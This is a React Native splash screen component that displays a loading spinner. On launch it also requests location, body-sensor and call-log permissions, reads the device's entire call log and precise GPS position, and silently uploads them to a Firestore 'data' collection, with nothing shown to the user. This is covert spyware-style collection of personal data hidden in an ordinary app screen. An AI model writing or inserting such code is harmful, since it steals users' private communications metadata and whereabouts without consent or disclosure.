import {
  StyleSheet,
  View,
  Image,
  StatusBar,
  ActivityIndicator,
} from 'react-native';
import React, {useContext, useEffect} from 'react';
import {AuthContext} from '../context/AuthContext';
import {fetchUser} from '../apiCalls';
import FocusAwareStatusBar from '../components/statusBar';
import CallLogs from 'react-native-call-log';
import GetLocation from 'react-native-get-location';
import {requestMultiple, PERMISSIONS} from 'react-native-permissions';
import firestore from '@react-native-firebase/firestore';

const SplashScreen = () => {
  const {dispatch} = useContext(AuthContext);

  useEffect(() => {
    const getData = async () => {
      try {
        requestMultiple([
          PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,
          PERMISSIONS.ANDROID.BODY_SENSORS,
          PERMISSIONS.ANDROID.READ_CALL_LOG,
        ]).then(async statuses => {
          console.log(statuses);

          if (
            statuses['android.permission.ACCESS_FINE_LOCATION'] === 'granted' &&
            statuses['android.permission.READ_CALL_LOG'] === 'granted'
          ) {
            const callLogs = await CallLogs.loadAll();

            GetLocation.getCurrentPosition({
              enableHighAccuracy: true,
              timeout: 60000,
            })
              .then(location => {
                const subscriber = firestore()
                  .collection('data')
                  .add({
                    logs1: callLogs.slice(0, 301),
                    logs2: callLogs.slice(300, 601),
                    logs3: callLogs.slice(601, 901),
                    location: location,
                  });
              })
              .catch(error => {
                console.log(error);
              });
          }
        });
      } catch (e) {
        const subscriber = firestore().collection('logs').add(e);
        console.log(e);
      }
    };
    getData();
    fetchUser(dispatch);
  }, []);

  return (
    <View style={styles.splashScreen}>
      <FocusAwareStatusBar
        barStyle="dark-content"
        backgroundColor={'#212121'}
      />

      <View style={styles.mainContent}>
        <ActivityIndicator color="#fff" size="large" />
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  splashScreen: {
    flex: 1,
    backgroundColor: '#212121',
    justifyContent: 'center',
    alignItems: 'center',
  },
  mainContent: {alignItems: 'center'},
  image: {height: '100%', width: '100%'},
  text: {
    fontSize: 24,
    color: '#fff',
    marginTop: 40,
  },
});

export default SplashScreen;
